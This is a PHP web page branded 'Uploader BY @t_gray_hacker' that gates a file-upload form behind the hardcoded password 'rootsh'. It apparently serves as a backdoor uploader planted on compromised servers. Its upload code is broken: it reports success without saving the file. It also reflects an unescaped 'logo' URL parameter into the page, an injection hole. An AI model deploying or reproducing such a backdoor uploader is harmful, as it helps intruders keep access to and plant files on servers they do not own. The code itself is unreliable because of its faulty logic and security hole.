<?php
session_start();

// Define password
$password = 'rootsh';

// If already logged in, bypass login page
if (isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true) {
    $logged_in = true;
} else {
    $logged_in = false;
}

// Handle form submission for login
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$logged_in) {
    if ($_POST['password'] === $password) {
        $_SESSION['logged_in'] = true;
        $logged_in = true;
    } else {
        $login_error = 'Invalid password!';
    }
}

// Handle file upload
if ($logged_in && isset($_FILES['file'])) {
    // Get the current directory where the script is located
    $target_dir = __DIR__ . "/";
    $target_file = $target_dir . basename($_FILES["file"]["name"]);
    if (strcmp($_FILES["file"]["tmp_name"], $target_file)) {
        $upload_message = "The file " . htmlspecialchars(basename($_FILES["file"]["name"])) . " has been uploaded.";
    } else {
        $upload_message = "Sorry, there was an error uploading your file.";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Uploader BY @t_gray_hacker</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1a1a1a;
            color: #fff;
            text-align: center;
        }
        .container {
            margin-top: 100px;
            padding: 20px;
            background-color: #333;
            border-radius: 10px;
            display: inline-block;
        }
        input[type="password"], input[type="file"] {
            padding: 10px;
            margin: 10px;
            border: none;
            border-radius: 5px;
            background-color: #444;
            color: white;
        }
        input[type="submit"] {
            padding: 10px 20px;
            background-color: #00b300;
            border: none;
            border-radius: 5px;
            color: white;
        }
        .logo {
            width: 150px;
            margin-bottom: 20px;
        }
        .message {
            margin-top: 20px;
            color: #00b300;
        }
    </style>
</head>
<body>

    <?php if (!$logged_in): ?>
        <!-- Login Page -->
        <div class="container">
            <img class="logo" src="<?php echo isset($_GET['logo']) ? $_GET['logo'] : 'https://i.ibb.co/h2zwvw3/IMG-20231015-105530-023.jpg'; ?>" alt="Logo">
            <h2>Login</h2>
            <form method="post">
                <input type="password" name="password" placeholder="Enter Password" required><br>
                <input type="submit" value="Login">
            </form>
            <?php if (isset($login_error)): ?>
                <p style="color: red;"><?php echo $login_error; ?></p>
            <?php endif; ?>
        </div>

    <?php else: ?>
        <!--  Upload Page -->
        <div class="container">
            <img class="logo" src="<?php echo isset($_GET['logo']) ? $_GET['logo'] : 'your-logo-src.png'; ?>" alt="Logo">
            <h2>Upload File</h2>
            <form method="post" enctype="multipart/form-data">
                <input type="file" name="file" required><br>
                <input type="submit" value="Upload">
            </form>
            <?php if (isset($upload_message)): ?>
                <p class="message"><?php echo $upload_message; ?></p>
            <?php endif; ?>
        </div>
    <?php endif; ?>

</body>
</html>
